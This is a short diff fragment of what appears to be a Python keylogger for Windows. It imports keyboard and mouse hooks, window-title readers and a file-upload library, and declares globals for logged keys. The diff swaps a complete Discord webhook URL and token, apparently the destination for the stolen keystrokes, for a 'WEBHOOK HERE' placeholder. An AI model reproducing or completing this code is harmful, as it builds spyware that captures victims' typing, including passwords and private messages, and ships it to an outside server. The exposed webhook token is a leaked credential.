@@ -3,7 +3,7 @@ import pynput, threading, win32api, time, anonfile, os, win32gui, unidecode, jso
 loggedKeys = "" 
 storedKey = ""
 activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-webhook = "https://discord.com/api/webhooks/1000719678412423178/i3gXhTbs85iGIJn7-dUptN5GfJHIxik6mwuwRkCeSMEDXCAclBU1e201E_dFJ3IA1db7"
+webhook = "WEBHOOK HERE"
 
 def mouseget():
     global loggedKeys 
